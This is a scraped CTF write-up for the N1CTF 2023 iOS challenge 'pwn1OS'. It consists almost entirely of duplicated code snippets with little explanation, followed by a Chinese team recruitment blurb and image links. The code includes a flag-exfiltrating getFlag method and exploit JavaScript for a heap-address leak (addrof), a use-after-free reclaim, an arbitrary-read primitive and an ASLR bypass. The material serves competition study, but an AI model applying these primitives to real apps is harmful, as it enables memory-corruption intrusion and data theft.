# N1CTF 2023 pwn1OS writeup

> 原文: https://www.ctfiot.com/140328.html
> ID: 140328

+ (void)getFlag:(NSString *)urlString { NSString *path = [[NSBundle mainBundle] pathForResource:@"flag" ofType:nil]; NSString *flag = [[NSData dataWithContentsOfFile:path] base64Encoding]; NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", urlString, flag]]; [NSData dataWithContentsOfURL:url];}

- (void)didReceiveNotification:(NSNotification *)notify { NSURL *url = (NSURL *)notify.object; NSString *scheme = url.scheme; NSString *host = url.host; if(![scheme isEqualToString:@"n1ctf"] || ![host isEqualToString:@"web"]) { return; }
 ...... WebViewController *web = [WebViewController new]; web.urlString= param[@"url"]; [self.navigationController pushViewController:web animated:YES]; }

Bob* bob = [[Bob alloc] init];[bob doSomething];

Bob* bob = objc_msgSend(BobClass, "alloc");bob = objc_msgSend(bob, "init");objc_msgSend(bob, "doSomething");

function addrof(obj) { var challenge = n1ctf.challenge(); n1ctf.setChallenge_(obj) try { n1ctf.challenge() } catch(e) { const match = /instance (0x[da-f]+)$/i.exec(e) if (match) return match[1] throw new Error('Unable to leak heap addr') } finally { n1ctf.setChallenge_(challenge) }}

var ctf = n1ctf.makeN1CTFIntroduction()ctf.dealloc()ctf

var req = n1ctf.makeHTTRequest()var ctf = n1ctf.makeN1CTFIntroduction() // malloc_size(N1CTFIntroduction) = 192ctf.dealloc()req.addMultiPartData_(base64('A'.repeat(192)))ctf

function arbitrary_read(addr, len) {
 var data = make_nsdata(addr, len) // 伪造 NSData，addr 和 len 分别是 buffer 的指针和长度 var req = n1ctf.makeHTTRequest() var ctf = n1ctf.makeN1CTFIntroduction() ctf.dealloc() req.addMultiPartData_(data) return ctf}

var coreservice = n1ctf.makeCoreService()var coreservice_addr = addrof(coreservice) // 泄露对象地址var coreservice_memory = arbitrary_read(coreservice_addr, 0x18) // 读取对象内存const match = /bytes = (0x[da-fs]{16})/.exec(coreservice_memory)var coreservice_isa = hexReverse(match[1]) // 大小端转换var CoreServiceClass = BigInt("0x" + coreservice_isa) & BigInt(0x0000000ffffffff8)var ASLR = CoreServiceClass - CoreServiceClass_offset

- (void)dealloc { ... [self.cancelRequest invoke]; ...}

以开放的心态拥抱信息安全机构、团队与个人之间的共赢协作

以自由的氛围和丰富的资源支撑优秀同学的个人发展与职业成长

扫上方二维码码关注我们，惊喜不断哦

M   O   M   O   S   E   C   U   R   I   T   Y


```
+ (void)getFlag:(NSString *)urlString { NSString *path = [[NSBundle mainBundle] pathForResource:@"flag" ofType:nil]; NSString *flag = [[NSData dataWithContentsOfFile:path] base64Encoding]; NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", urlString, flag]]; [NSData dataWithContentsOfURL:url];}
```



```
- (void)didReceiveNotification:(NSNotification *)notify { NSURL *url = (NSURL *)notify.object; NSString *scheme = url.scheme; NSString *host = url.host; if(![scheme isEqualToString:@"n1ctf"] || ![host isEqualToString:@"web"]) { return; }
 ...... WebViewController *web = [WebViewController new]; web.urlString= param[@"url"]; [self.navigationController pushViewController:web animated:YES]; }
```



```
Bob* bob = [[Bob alloc] init];[bob doSomething];
```



```
Bob* bob = objc_msgSend(BobClass, "alloc");bob = objc_msgSend(bob, "init");objc_msgSend(bob, "doSomething");
```



```
function addrof(obj) { var challenge = n1ctf.challenge(); n1ctf.setChallenge_(obj) try { n1ctf.challenge() } catch(e) { const match = /instance (0x[da-f]+)$/i.exec(e) if (match) return match[1] throw new Error('Unable to leak heap addr') } finally { n1ctf.setChallenge_(challenge) }}
```



```
var ctf = n1ctf.makeN1CTFIntroduction()ctf.dealloc()ctf
```



```
var req = n1ctf.makeHTTRequest()var ctf = n1ctf.makeN1CTFIntroduction() // malloc_size(N1CTFIntroduction) = 192ctf.dealloc()req.addMultiPartData_(base64('A'.repeat(192)))ctf
```



```
function arbitrary_read(addr, len) {
 var data = make_nsdata(addr, len) // 伪造 NSData，addr 和 len 分别是 buffer 的指针和长度 var req = n1ctf.makeHTTRequest() var ctf = n1ctf.makeN1CTFIntroduction() ctf.dealloc() req.addMultiPartData_(data) return ctf}
```



```
var coreservice = n1ctf.makeCoreService()var coreservice_addr = addrof(coreservice) // 泄露对象地址var coreservice_memory = arbitrary_read(coreservice_addr, 0x18) // 读取对象内存const match = /bytes = (0x[da-fs]{16})/.exec(coreservice_memory)var coreservice_isa = hexReverse(match[1]) // 大小端转换var CoreServiceClass = BigInt("0x" + coreservice_isa) & BigInt(0x0000000ffffffff8)var ASLR = CoreServiceClass - CoreServiceClass_offset
```



```
- (void)dealloc { ... [self.cancelRequest invoke]; ...}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/2-1698074986.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/9-1698075007.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/10-1698075009.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/4-1698075010.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/10-1698075012.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/9-1698075013.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/1-1698075014.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/9-1698075016.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/0-1698075018.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/9-1698075021.jpeg)